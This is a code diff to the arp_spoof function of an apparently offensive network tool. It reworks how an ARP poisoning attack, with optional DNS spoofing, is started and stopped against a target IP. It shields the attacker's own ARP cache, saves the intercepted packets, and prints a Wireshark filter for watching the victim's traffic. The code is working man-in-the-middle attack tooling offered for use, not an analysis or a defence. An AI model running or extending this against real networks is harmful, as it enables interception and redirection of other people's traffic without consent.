@@ -238,29 +238,42 @@ def arp_spoof(*, target_ip: str, iface: str, do_save: bool = False, dns_domain: 
     )
     console.print(panel)
     
-    arp_poison = attacks.ArpPoisoning(
-        target=target, 
-        gateway=gateway, 
-        iface=iface, 
-        do_save=do_save,
-        original_domain=dns_domain,
-        spoofed_ip=dns_ip
-    )
-    with console.status("\n[success_bold]Attack is running![/] [muted]Traffic is being intercepted and forwarded.[/]"):
-        try:
-            if do_save:
-                console.print(f"[success]Saving packets to:[/] [info_bold]{arp_poison.pcap_filename}[/]")
-            
-            ws_filter = f"ip.addr == {target_ip}"
-            console.print(f"[info]💡 Tip:[/] [muted_light]Open Wireshark on [info_bold]{iface}[/] and use this filter to see the target's traffic:[/]")
-            console.print(f"       [highlight]{ws_filter}[/]")
-            
-            console.input("\n[info_bold]Press ENTER to stop the attack...[/]\n")
-        except KeyboardInterrupt:
-            console.print()
+    # --- ARP SHIELD START ---
+    # set a static ARP entry for our gateway so our machine ignores the spoofed packets
+    with console.status(f"[muted]Shielding local ARP cache for gateway [info]{gateway_ip}[/]...[/]"):
+        set_static_arp(iface, gateway_ip, gateway_mac)
     
-    with console.status("[warning]Stopping attack and restoring ARP tables...[/]"):
-        arp_poison.stop()
+    try:
+        arp_poison = attacks.ArpPoisoning(
+            target=target, 
+            gateway=gateway, 
+            iface=iface, 
+            do_save=do_save,
+            original_domain=dns_domain,
+            spoofed_ip=dns_ip
+        )
+        arp_poison.start()
+        
+        with console.status("\n[success_bold]Attack is running![/] [muted]Traffic is being intercepted and forwarded.[/]"):
+            try:
+                if do_save:
+                    console.print(f"[success]Saving packets to:[/] [info_bold]{arp_poison.pcap_filename}[/]")
+                
+                ws_filter = f"ip.addr == {target_ip}"
+                console.print(f"[info]💡 Tip:[/] [muted_light]Open Wireshark on [info_bold]{iface}[/] and use this filter to see the target's traffic:[/]")
+                console.print(f"       [highlight]{ws_filter}[/]")
+                
+                console.input("\n[info_bold]Press ENTER to stop the attack...[/]\n")
+            except KeyboardInterrupt:
+                console.print()
+    finally:
+        # --- ARP SHIELD END ---
+        with console.status("[warning]Stopping attack and restoring ARP tables...[/]"):
+            if 'arp_poison' in locals():
+                arp_poison.stop()
+            
+            console.print(f"[muted]Reverting local gateway ARP to dynamic...[/]")
+            remove_static_arp(iface, gateway_ip)
         
     console.print(Rule(title="[info_bold]Attack Stopped[/]", style="border"))
     console.print()
